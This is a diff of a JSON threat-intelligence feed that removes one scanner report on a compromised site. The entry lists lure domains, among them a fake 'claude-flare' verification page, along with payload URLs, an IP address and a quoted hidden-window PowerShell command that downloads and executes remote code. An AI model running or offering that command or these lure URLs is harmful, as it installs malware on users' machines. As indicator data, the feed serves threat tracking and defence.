@@ -584,26 +584,5 @@
     ],
     "ReportId": "cmwxoyrm40fd70oml5xlrq4dq",
     "ScannedAt": "2026-11-26T15:12:41.320000+00:00"
-  },
-  {
-    "UrlDomain": "cms.abupi.or.id",
-    "DeliveryUrl": [
-      "browse-login.info",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "2fcms.abupi.or"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win"
-    ],
-    "IP": [
-      "77.37.83.28"
-    ],
-    "Related": [],
-    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwxoht2w0fc80oml53cyksew",
-    "ScannedAt": "2026-11-26T14:59:30.123000+00:00"
   }
 ]
